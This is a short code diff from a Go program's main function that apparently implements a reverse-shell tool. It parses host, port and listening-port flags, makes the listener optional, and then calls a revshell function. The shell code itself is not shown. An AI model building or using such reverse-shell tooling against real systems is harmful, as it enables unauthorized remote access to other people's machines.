@@ -13,7 +13,10 @@ func main() {
 	var port = flag.String("p", "port", "Specify the port number to connect to")
 	var lport = flag.String("l", "listen", "Specify a listening port on the machine example of the flag -l 80")
 	flag.Parse()
-	listen(*lport)
+	if *lport != "listen" {
+
+		listen(*lport)
+	}
 	revshell(*host, *port)
 }
 
